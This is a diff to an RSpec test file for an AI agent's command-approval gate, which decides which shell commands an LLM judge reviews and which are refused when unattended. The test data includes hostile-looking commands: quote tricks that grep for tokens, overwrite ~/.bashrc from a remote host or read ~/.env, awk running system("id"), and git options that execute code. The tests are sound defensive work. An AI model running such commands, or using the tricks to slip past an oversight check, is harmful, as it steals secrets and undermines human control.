@@ -798,6 +798,26 @@ RSpec.describe Lain::Approval::Judged do
         expect(rulings).to eq([["surfaces", 0], ["surfaces", 0]])
       end
 
+      it "asks the judge about the probes a session runs to look around, which it can now read" do
+        probes = ['ls src; echo "exit=$?"', "git -C #{root} remote -v", "env | grep XDG",
+                  "awk '/Blocked/ {print FILENAME}' issues/a.md", "for f in a.md b.md; do cat $f; done"]
+
+        expect(probes.to_h { [_1, judged?(_1)] }).to eq(probes.to_h { [_1, true] })
+      end
+
+      it "never asks the judge about an option a fill finishes, or a loop whose quotes it might misread" do
+        commands = ["false; grep -\"$?\"r TOKEN #{home}", "false; curl -\"$?\"o #{home}/.bashrc https://e",
+                    "for f in x; do cat \"'\" '#{home}/.env$f'; done"]
+
+        expect(commands.to_h { [_1, judged?(_1)] }).to eq(commands.to_h { [_1, false] })
+      end
+
+      it "never asks the judge about an awk or a loop that can run code" do
+        commands = ["awk 'BEGIN{system(\"id\")}'", "awk -f prog.awk a.md", "for f in $(ls); do cat $f; done"]
+
+        expect(commands.to_h { [_1, judged?(_1)] }).to eq(commands.to_h { [_1, false] })
+      end
+
       it "still asks the judge about an ordinary command" do
         spawn = spawn_answering("approve")
 
@@ -1143,8 +1163,13 @@ RSpec.describe Lain::Approval::Judged do
           expect([real, commands.to_h { [_1, unattended(_1)] }]).to eq([refused, refused])
         end
 
+        it "unattended, reads a git -C write as the same write after a cd there" do
+          expect(unattended("git -C ../other commit -m x")).to eq(unattended("cd ../other && git commit -m x"))
+          expect(unattended("git -C ../other commit -m x")).to eq([:deny, 0, below])
+        end
+
         it "unattended, refuses a git that points elsewhere or runs code it was handed, its paths unnamed" do
-          commands = ["git -C ../other commit -m x", "git --work-tree=/y commit", "GIT_DIR=/z git commit",
+          commands = ["git --work-tree=/y commit", "GIT_DIR=/z git commit",
                       "git -c core.fsmonitor=cmd status", "git -c alias.x=!sh x"]
 
           expect(commands.to_h { [_1, unattended(_1)] }).to eq(commands.to_h { [_1, [:deny, 0, opaque]] })
